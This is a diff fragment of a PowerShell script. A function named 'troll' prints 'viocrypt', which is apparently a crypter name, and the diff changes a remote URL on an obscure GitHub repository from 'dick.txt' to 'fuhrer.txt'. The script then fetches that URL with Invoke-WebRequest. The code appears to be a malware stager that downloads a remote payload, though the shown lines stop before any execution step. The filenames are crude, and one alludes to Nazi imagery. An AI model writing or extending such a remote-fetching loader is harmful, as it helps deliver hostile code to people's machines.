@@ -6,7 +6,7 @@ function troll() {
     Write-Host "viocrypt"
 }
 
-$url = "https://raw.githubusercontent.com/HeadShotXx/dxdasaxdsacdsadsacdsxdasacdaxsdcsdaxsadaxdscsa/main/dick.txt"
+$url = "https://raw.githubusercontent.com/HeadShotXx/dxdasaxdsacdsadsacdsxdasacdaxsdcsdaxsadaxdscsa/main/fuhrer.txt"
 
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 
